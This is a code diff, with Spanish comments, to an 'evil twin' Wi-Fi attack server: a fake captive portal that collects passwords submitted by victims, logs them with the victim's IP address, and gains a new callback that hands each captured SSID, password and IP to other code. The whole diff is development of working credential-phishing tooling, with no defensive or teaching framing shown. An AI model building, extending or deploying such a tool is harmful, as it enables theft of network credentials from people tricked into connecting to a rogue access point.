@@ -5,7 +5,7 @@ import logging
 import socket
 import sys
 import threading
-from typing import TYPE_CHECKING
+from typing import TYPE_CHECKING, Callable
 
 from evil_twin_events import EventBus, EventoCaptura
 from evil_twin_renderer import PortalRenderer
@@ -67,19 +67,22 @@ class EvilTwinServer:
         bus: EventBus | None = None,
         renderer: PortalRenderer | None = None,
         store: CapturaStore | None = None,
+        on_capture: Callable[[str, str, str],
+                             None] | None = None,  # <-- NUEVO CALLBACK
     ) -> None:
         self.ssid = ssid
         self.host = host
         self.port = port
 
-        self._log      = log
-        self._bus      = bus or EventBus()
+        self._log = log
+        self._bus = bus or EventBus()
         self._renderer = renderer or PortalRenderer()
-        self._store    = store or CapturaStore()
+        self._store = store or CapturaStore()
+        self._on_capture = on_capture  # <-- GUARDAMOS EL CALLBACK
 
-        self._srv:  make_server | None    = None
+        self._srv:  make_server | None = None
         self._hilo: threading.Thread | None = None
-        self._lock  = threading.Lock()
+        self._lock = threading.Lock()
 
         self._app = self._crear_app()
 
@@ -90,7 +93,8 @@ class EvilTwinServer:
                     f"El servidor ya está activo en {self.host}:{self.port}."
                 )
             _verificar_puerto(self.host, self.port)
-            self._srv = make_server(self.host, self.port, self._app, threaded=True)
+            self._srv = make_server(
+                self.host, self.port, self._app, threaded=True)
             self._hilo = threading.Thread(
                 target=self._srv.serve_forever,
                 daemon=True,
@@ -155,12 +159,20 @@ class EvilTwinServer:
             password = request.form.get("password", "").strip()
             if password:
                 total = self._store.agregar(password)
-                self._log_info(f"Credencial capturada — SSID: {self.ssid}")
+                client_ip = request.remote_addr or "unknown"
+
+                self._log_info(
+                    f"Credencial capturada — SSID: {self.ssid} — IP: {client_ip}")
+
                 self._bus.emitir(EventoCaptura(
                     ssid=self.ssid,
                     password=password,
                     total=total,
                 ))
+
+                if self._on_capture:
+                    self._on_capture(self.ssid, password, client_ip)
+
             return self._renderer.cierre()
 
         return app
